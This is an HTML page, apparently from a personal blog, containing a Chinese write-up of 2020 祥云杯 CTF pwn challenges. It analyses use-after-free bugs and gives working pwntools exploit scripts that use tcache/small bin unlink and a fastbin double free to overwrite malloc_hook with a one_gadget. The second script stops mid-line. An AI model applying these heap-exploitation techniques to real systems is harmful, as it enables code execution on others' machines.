@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta name="renderer" content="webkit"/>
+    <meta name="force-rendering" content="webkit"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <script>if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode)) window.location.href="https://support.dmeng.net/upgrade-your-browser.html?referrer="+encodeURIComponent(window.location.href); </script>
+    
+    
+        <link rel="shortcut icon" href="/img/favicon.ico">
+    
+     
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.13.1/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/vuetify@2.2.30/dist/vuetify.min.css" rel="stylesheet">
+    
+<link rel="stylesheet" href="/css/main.css">
+
+    
+    
+
+
+
+
+
+
+
+    
+    
+          
+
+    
+    
+    
+    
+    <title>
+        
+            2020 祥云杯 | Clindy&#39;s Blog
+        
+    </title>
+    
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+<body>
+    <div id="app">
+        <v-app>
+            <v-content id="page">
+                <v-container fluid>
+                    <v-row>
+                        <v-col cols="2" class="d-none d-md-block">
+                            <div id="sidebar" class="float-right">
+    <a href="/" rel="home">
+        <v-avatar size=96>
+            <img id="logo" src="/img/head.jpg">     
+        </v-avatar> 
+    </a>
+    <v-divider></v-divider>
+    <div class="mini-menu">
+        <v-btn icon href="/">
+            <v-icon>home</v-icon>
+        </v-btn>
+        <v-btn icon href="/categories/">
+            <v-icon>folder</v-icon>
+        </v-btn>
+        <v-btn icon href="/tags/">
+            <v-icon>bookmark</v-icon>
+        </v-btn>
+        <v-btn icon @click="SetNightMode">
+            <v-icon>{{ nightMode }}</v-icon>
+        </v-btn>
+    </div>
+    <v-list id="main-menu" class="font-weight-bold" flat>
+        
+            
+            <v-list-item href="/classic/" link>
+            <v-list-item-icon><v-icon>account_circle</v-icon></v-list-item-icon>
+            <v-list-item-content>
+                经典例题
+            </v-list-item-content>
+            </v-list-item>
+        
+            
+            <v-list-item href="/archives/" link>
+            <v-list-item-icon><v-icon>archive</v-icon></v-list-item-icon>
+            <v-list-item-content>
+                时间线
+            </v-list-item-content>
+            </v-list-item>
+        
+    </v-list>
+    <v-divider></v-divider>
+    
+        <div class="post-toc">
+            <a href="/2020/11/22/Game/%E7%A5%A5%E4%BA%91%E6%9D%AF/" class="toc-header">Table of Contents</a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A5%A5%E4%BA%91%E6%9D%AF"><span class="toc-number">1.</span> <span class="toc-text">祥云杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#chang-chun-is-beautiful"><span class="toc-number">1.1.</span> <span class="toc-text">chang_chun_is_beautiful</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.2.</span> <span class="toc-text">攻击思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E6%B5%81%E4%B9%8B%E4%B8%BB"><span class="toc-number">1.2.</span> <span class="toc-text">影流之主</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">攻击思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Eglob"><span class="toc-number">1.2.3.</span> <span class="toc-text">关于glob</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#garden"><span class="toc-number">1.3.</span> <span class="toc-text">garden</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">攻击思路</span></a></li></ol></li></ol></li></ol>
+            </div>
+        </div>
+    
+
+    <div id="footer">
+        <div class="footer-social">
+            
+                
+                <v-btn icon href="mailto:clindy.h@qq.com" target="_blank">
+                    <v-icon>fas fa-envelope</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://github.com/" target="_blank">
+                    <v-icon>fab fa-github</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://baidu.com" target="_blank">
+                    <v-icon>fab fa-weibo</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://baidu.com" target="_blank">
+                    <v-icon>fab fa-qq</v-icon>
+                </v-btn>
+            
+        </div>
+        <v-divider></v-divider>
+        <div class="footer-content">
+            
+                <span id="busuanzi_container_site_uv" style="display: none;"> 
+                    Total Visitors <span id="busuanzi_value_site_uv"></span>
+                </span>
+                <br>
+            
+            <span>Theme: <a target="_blank" rel="noopener" href="https://github.com/kb1000fx/hexo-theme-insulin">Insulin</a></span><br>
+            <span>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a></span><br>
+            <span>
+                &copy; 2020 - 2021 
+                Clindy
+            </span>
+        </div>
+    </div>
+</div>
+
+                        </v-col>
+                        <v-col cols="12" md="10">
+                            <v-row>
+  <v-col cols="12" md="8" align-self="end">
+    <div id="site-header">
+      <div id="site-title">
+        <a href="/" rel="home">Clindy&#39;s Blog</a>
+      </div>
+      <div id="site-description">像风走了八千里，不问归期</div>
+      <div id="mobile-menu" class="d-block d-md-none">
+        <v-text-field label="请输入关键字" data-src="search.xml" v-model="searchHeaderValue" prepend-inner-icon="search" clearable clear-icon="clear" @keydown.enter="EnterSearch(searchHeaderValue,false)"></v-text-field>
+        <div class="mobile-mini-menu">
+          <v-btn icon href="/">
+              <v-icon>home</v-icon>
+          </v-btn>
+          <v-btn icon href="/categories/">
+              <v-icon>folder</v-icon>
+          </v-btn>
+          <v-btn icon href="/tags/">
+              <v-icon>bookmark</v-icon>
+          </v-btn>
+          <v-btn icon @click="SetNightMode">
+              <v-icon>{{ nightMode }}</v-icon>
+          </v-btn>
+          
+            
+            <v-btn icon href="/classic/">
+              <v-icon>account_circle</v-icon>
+            </v-btn>
+          
+            
+            <v-btn icon href="/archives/">
+              <v-icon>archive</v-icon>
+            </v-btn>
+          
+        </div>
+      </div>    
+    </div>
+  </v-col>  
+  <v-col cols="4" align-self="end" class="d-none d-md-block">
+    <v-col align-self="end">
+      <v-text-field label="请输入关键字" data-src="search.xml" v-model="searchHeaderValue" prepend-icon="search" clearable clear-icon="clear" @keydown.enter="EnterSearch(searchHeaderValue,false)"></v-text-field>
+    </v-col> 
+  </v-col>
+</v-row>
+
+                            <v-card class="elevation-2 post-card">
+    
+    
+        <div class="post-header">
+  <a class="post-header-title font-weight-medium" href="/2020/11/22/Game/%E7%A5%A5%E4%BA%91%E6%9D%AF/">2020 祥云杯</a>
+  <div class="post-header-meta">   
+    <span>
+      <v-icon color="">event</v-icon>
+      Posted on:&nbsp;2020-11-22
+    </span>
+    <span>
+      <v-icon color="">event_available</v-icon>
+      Edited on:&nbsp;2021-01-14
+    </span>
+    <span>
+      <v-icon color="">folder</v-icon>
+      In:&nbsp;<a class="category-link" href="/categories/Game/">Game</a>
+    </span>
+    
+    <span>
+      <v-icon color="">visibility</v-icon>
+      Views:&nbsp;<span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span></span>
+    </span>
+    
+  </div>
+</div>
+
+    
+    
+    
+    
+    <div class="post-content typo">
+        <h1 id="祥云杯"><a href="#祥云杯" class="headerlink" title="祥云杯"></a>祥云杯</h1><h2 id="chang-chun-is-beautiful"><a href="#chang-chun-is-beautiful" class="headerlink" title="chang_chun_is_beautiful"></a>chang_chun_is_beautiful</h2><p>没给库，<del>猜测是2.27版本</del>，踩坑后发现是2.29+的版本。</p>
+<p>64位小端，保护机制全开。</p>
+<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>开始运行时会进行初始化，mmap一块内存，在调用urandom库，给mmap的前8字节加上随机数。之后读取flag.txt，把flag存在随机数后面。mmap的地址和flag的长度会在开始时作为gift泄露给我们。还有一个后门函数，运行函数的话，程序会比较我们申请的堆块的内容是否和生成的随机数的值相等，如果相等，则打印出flag。</p>
+<p>进入到main函数，有6个选项，分别是：</p>
+<p><strong>1.add</strong></p>
+<p>用calloc申请堆块，意味着无法用add操作从tcache中取出堆块来用了。程序限制我们最多只能申请三个堆块，大小在0x7F到0x100之间，没有fast bin。有一个全局指针数组存索引，一个全局数组存堆块大小。</p>
+<p><strong>2.delete</strong></p>
+<p>输入索引，索引范围0-9。free掉堆块指针。有uaf，把size数组对应的大小清零。但这里清零时用了LOBYTE，只会清零最低位一个字节，如果size为0x100，则不会被清空。</p>
+<p><strong>3.edit</strong></p>
+<p>先在栈上申请了一块内存，大小为0x401。输入size，如果0x7F&lt;=size&lt;=0x3ff，则可以往栈上输入内容，然后把栈上的内容拷贝到堆上。</p>
+<p><strong>4.show</strong></p>
+<p>先获取索引，如果 idx小于&lt;=9，并且对应的size位不为0，即可查看堆的内容。有一个count全局变量，初始值为2，每show一次会自减，为0时无法再show。也就是说只能show两次。</p>
+<p><strong>5.backdoor</strong></p>
+<p>show的次数用完后才可以调用。</p>
+<p>第一次调用时让我们在栈上输入0x30个字节。</p>
+<p>然后malloc一个大堆块，把我们的输入赋给这个大堆块。</p>
+<p>之后调用会比较堆块值和random的值，相同则打印flag。</p>
+<p><strong>666.</strong></p>
+<p>calloc一个大小为0x3ff的堆块，只能用一次。</p>
+<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>程序是按照SIZE数组来分配的。add的堆块会放入size为0的地方。free时size会清零，size非零才能edit和show和delete。所以即便知道有uaf，也无法直接利用。</p>
+<p>但仔细观察delete函数，将size清零时，只清零了LOBYTE，也就是最后一个字节，如果我们定义size大小为0x100，free时就不会将这个大小清零。</p>
+<p>另外0x100和0xff申请堆块的大小是相同的，都是0x110，可以通过释放7个0xff填满0x110的tcache，再释放0x100大小的堆块，进入unsorted bin，利用show操作泄露main_anera+96的地址。</p>
+<p>当时考虑的是unsorted bin attack，通过修改unsorted bin 的bk指针，令它指向mmap-0x10的位置，当从unsorted bin中add堆块时，会触发unlink操作，mmap处的值会被改为main_arena+96的地址。因为main_arena+96的地址前面已经泄露出来了，再把一个堆地址改成main_arena+96的值，去调用后门函数，就可以通过验证拿到flag了。当时本地2.27版本已经通过了测试，但远程连接却不行。</p>
+<p>于是猜测是更高级的版本，保护机制更严格。于是上网搜集资料，看到了这篇文章：<a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1667371310650833624&amp;wfr=spider&amp;for=pc%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%8F%AF%E4%BB%A5%E6%9C%89%E6%9B%BF%E4%BB%A3%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%8C%E5%8F%AA%E6%98%AF%E5%A0%86%E5%9D%97%E6%9E%84%E9%80%A0%E4%BC%9A%E6%9B%B4%E5%A4%8D%E6%9D%82%E4%B8%80%E4%BA%9B%E3%80%82">https://baijiahao.baidu.com/s?id=1667371310650833624&amp;wfr=spider&amp;for=pc，发现可以有替代的方法，只是堆块构造会更复杂一些。</a></p>
+<p>我们需要有6个相同大小的tcache和两个small bin。此时add堆块时，因为是calloc，会先从small bin里面取堆块，然后把另一个small bin里的堆块链入tcache。此时也会触发unlink操作，而small bin的unlink并没用unsorted bin中那种检查机制，因此就可以利用成功了。至于如何构造6个tcache和2个small bin，可以看利用脚本。</p>
+<p>当时用新方法本地跑通了，而远程依然没跑通，怀疑是库版本不对导致small bin的main_arena有细微偏移，只好用爆破的方法，爆出了它的实际位置。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enjoy scenery&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enjoy scenery&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span><span class="comment">#no free</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enjoy scenery&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;chat:&#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span> <span class="comment">#2 times</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enjoy scenery&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callo</span>():</span> <span class="comment">#1 time</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enjoy scenery&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">addsize = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./changchun&quot;</span>)</span><br><span class="line">        <span class="comment">#p = remote(&quot;112.126.71.170&quot;, 43652)</span></span><br><span class="line">        p.recvuntil(<span class="string">&quot;A gift from ChangChun People\n&quot;</span>)</span><br><span class="line">        mmap = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">        <span class="comment">#info(&quot;mmap &lt;============ 0x%x&quot;,mmap)</span></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x100</span>)  <span class="comment">#0  </span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">            add(<span class="number">0xff</span>)</span><br><span class="line">            delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x100</span>)   <span class="comment">#1 </span></span><br><span class="line">        add(<span class="number">0x80</span>)	 <span class="comment">#2</span></span><br><span class="line">        delete(<span class="number">2</span>)    <span class="comment">#Create a Tcache to prevent merging</span></span><br><span class="line"></span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&quot;see\n&quot;</span>)</span><br><span class="line">        main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) + addsize</span><br><span class="line">        addsize += <span class="number">0x8</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;addsize ============= &quot;</span>,addsize</span><br><span class="line">        <span class="comment">#pause()</span></span><br><span class="line">        <span class="comment">#info(&quot;main_arena &lt;=============== 0x%x&quot;,main_arena)</span></span><br><span class="line"> </span><br><span class="line">        delete(<span class="number">1</span>)  </span><br><span class="line"></span><br><span class="line">        show(<span class="number">1</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;see\n&quot;</span>)</span><br><span class="line">        heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">        <span class="comment">#info(&quot;heap_addr &lt;=============== 0x%x&quot;,heap_addr)</span></span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Enjoy scenery&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;666&quot;</span>)</span><br><span class="line"></span><br><span class="line">        edit(<span class="number">1</span>,p64(heap_addr)+p64(mmap-<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Enjoy scenery&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;5&#x27;</span>) <span class="comment">#after double show,we will malloc(0x108) ,we have 6 tcache now</span></span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">        add(<span class="number">0xff</span>)    <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">        edit(<span class="number">0</span>,p64(main_arena)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Enjoy scenery&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;input idx\n&quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        a = p.recvline(<span class="string">&quot;&quot;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">5</span> &lt; <span class="built_in">len</span>(a) &lt;<span class="number">40</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;=======================&gt;&quot;</span>,a,<span class="string">&quot;&lt;========================&quot;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="影流之主"><a href="#影流之主" class="headerlink" title="影流之主"></a>影流之主</h2><p>祥云杯第4道pwn题。</p>
+<p>64位小端序，没开PIE。</p>
+<p>利用难度没那么大，就是需要分析一个新函数。</p>
+<h3 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h3><p>有一个菜单，5个选项。~~每个选项都有存有一个变量用来限制次数~~~，每个选项会有干扰，如果输入的choice对应变量自减后为0，需要再重新输入一次，让对应变量值自减为-1，这样才能继续相关操作。（比如show操作为2，第一次show变量先变为1再执行show，第二次show变量变为0，不会执行show，再次执行show，变量变为-1，之后就不会有限制了）</p>
+<p><strong>1.add，7 times</strong>  </p>
+<p>索引存在全局指针数组中，每次在第一个索引不为空的位置申请。大小固定0x60，最多申请12个。</p>
+<p><strong>2.delete，3 times</strong></p>
+<p>输入索引，free掉对应位置的堆块。存在uaf</p>
+<p><strong>3.edit，2 times</strong></p>
+<p>输入索引，往堆上写0x30个字符</p>
+<p><strong>4.show，1 times</strong></p>
+<p>可以泄露8个字节。</p>
+<p><strong>5.fun_glob，1 times</strong></p>
+<p>最往栈上的pattern[168]写入166个字节，按回车会提前结束。</p>
+<p>pglob里面会存有文件信息，pattern由我们输入。</p>
+<p>猜测golb和globfree这两个函数是破题的关键。在~/.gdbinit 文件中插入源码路径，就可以对其进行源码级调试了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir &#x2F;usr&#x2F;src&#x2F;glibc&#x2F;glibc-2.23&#x2F;posix</span><br></pre></td></tr></table></figure>
+<h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>这题没给库，但因为只能申请大小为0x70（malloc(0x60)）大小的堆块，我们可以先add两个堆块，对同一个堆块free两次，服务端会报：double free or corruption (fasttop) 的错误，由此得知是2.23版本的库。</p>
+<p>因为程序中有uaf，malloc大小固定0x60，可以直接double free。但是fastbin大小为0x70，我们必须找到某个地方的值为0x7*，才能把fast bin放上去。考虑malloc_hook-0x23的位置（那里是0x7f）。</p>
+<p>查了些glob函数的资料，它主要用于Linux文件系统中路径名称的模式匹配，即查找文件系统中指定模式的路径。函数原型：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">glob</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pattern, <span class="keyword">int</span> flags,<span class="keyword">int</span> errfunc(<span class="keyword">const</span> <span class="keyword">char</span> *epath, <span class="keyword">int</span> eerrno),<span class="keyword">glob_t</span> *pglob)</span></span>;</span><br><span class="line"><span class="comment">//第一个参数传匹配的pattern。如/* ， /dev/* ， /home/* ...</span></span><br><span class="line"><span class="comment">//第二个参数能选择匹配模式，如是否排序，或者在函数第二次调用时，是否将匹配的内容追加到pglob中</span></span><br><span class="line"><span class="comment">//第3个参数是查看错误信息用，一般置为NULL</span></span><br><span class="line"><span class="comment">//第四个参数用来存匹配到的信息</span></span><br></pre></td></tr></table></figure>
+<p>动态调试一下这个函数，随便选挑几个路径试一试，当路径为*”/home/*“*时（应该还有很多其它路径都满足条件），堆区会生成一个unsorted bin和若干个大小为0x20的fastbin。再次执行一下这个操作，生成的bin都会被合并到top chunk中。之后利用思路就清晰了：</p>
+<ol>
+<li><p>首先需要泄露内存信息，调用fun_glob，让它产生unsorted bin，再add 一个堆，此时fast bin中会残留unsorted bin中的fd指针信息，show一下可以泄露出main_arena地址，继而泄露libc基址</p>
+</li>
+<li><p>delete一个堆块，利用uaf漏洞修改fast bin的fd指针，令其指向malloc_hook-0x23的位置，add两次，把fast bin分配到上面，用edit函数修改malloc_hook为one_gadget即可。</p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>():</span>  <span class="comment">#7 times</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span>    <span class="comment">#1 times</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span>  <span class="comment">#1 times</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span>  <span class="comment">#1 times</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">content</span>):</span>   <span class="comment">#1 times</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">one_gadget = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;./ying_liu_zhi_zhu&quot;</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(file)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span 